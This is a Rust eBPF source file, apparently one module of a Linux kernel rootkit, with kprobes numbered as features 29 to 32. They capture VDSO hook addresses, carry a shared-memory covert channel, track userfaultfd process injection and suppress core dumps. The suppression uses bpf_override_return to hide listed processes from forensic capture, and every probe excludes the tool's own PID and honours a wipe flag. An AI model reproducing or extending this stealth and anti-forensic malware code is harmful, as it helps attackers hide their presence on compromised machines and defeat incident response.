use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::kprobe,
    programs::ProbeContext,
};
use common::{
    EventHeader, EVENT_COREDUMP_SUPPRESSED, EVENT_SHM_COVERT_MSG, EVENT_UFFD_INJECTION,
    EVENT_VDSO_HOOKED,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 29: VDSO/Vsyscall Hooking
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_vdso_setup(ctx: ProbeContext) -> u32 {
    try_vdso_setup(&ctx).unwrap_or_default()
}

fn try_vdso_setup(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let mm_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let vdso_addr: u64 =
        unsafe { bpf_probe_read_kernel((mm_ptr + 432) as *const u64)? };

    if let Some(slot) = unsafe { VDSO_HOOK_ADDRS.get_ptr_mut(0) } {
        unsafe { *slot = vdso_addr };
    }

    let event = EventHeader {
        event_type: EVENT_VDSO_HOOKED,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: vdso_addr,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 30: Shared Memory Covert Channel
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_shmat_enter(ctx: ProbeContext) -> u32 {
    try_shmat_enter(&ctx).unwrap_or_default()
}

fn try_shmat_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let shmid: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let shmaddr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };

    let event = EventHeader {
        event_type: EVENT_SHM_COVERT_MSG,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: shmid,
    };
    let _ = EVENTS.output(&event, 0);

    if let Some(buf) = SHM_CHANNEL.reserve::<[u8; 64]>(0) {
        let ptr = buf.as_mut_ptr();
        unsafe {
            let data = (shmaddr as u32).to_ne_bytes();
            core::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, 4);
        }
        buf.submit(0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 31: Process Injection via Userfaultfd
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_uffd_ioctl(ctx: ProbeContext) -> u32 {
    try_uffd_ioctl(&ctx).unwrap_or_default()
}

fn try_uffd_ioctl(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let cmd: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
    const UFFDIO_COPY: u64 = 0xC028AA03;

    if cmd != UFFDIO_COPY {
        return Ok(0);
    }

    let arg_ptr: u64 = unsafe { ctx.arg(2).ok_or(1i64)? };
    let dst_addr: u64 = unsafe { bpf_probe_read_kernel(arg_ptr as *const u64)? };

    if unsafe { UFFD_TARGETS.get(&pid) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_UFFD_INJECTION,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: dst_addr,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 32: Core Dump Suppression
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_do_coredump(ctx: ProbeContext) -> u32 {
    try_do_coredump(&ctx).unwrap_or_default()
}

fn try_do_coredump(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let should_suppress =
        unsafe { COREDUMP_PIDS.get(&pid) }.is_some() || unsafe { HIDDEN_PIDS.get(&pid) }.is_some();

    if should_suppress {
        let event = EventHeader {
            event_type: EVENT_COREDUMP_SUPPRESSED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: 0,
        };
        let _ = EVENTS.output(&event, 0);

        #[cfg(target_arch = "bpf")]
        unsafe {
            let _ = aya_ebpf::helpers::gen::bpf_override_return(
                ctx.as_ptr() as *mut _,
                -1i64 as u64,
            );
        }
    }

    Ok(0)
}
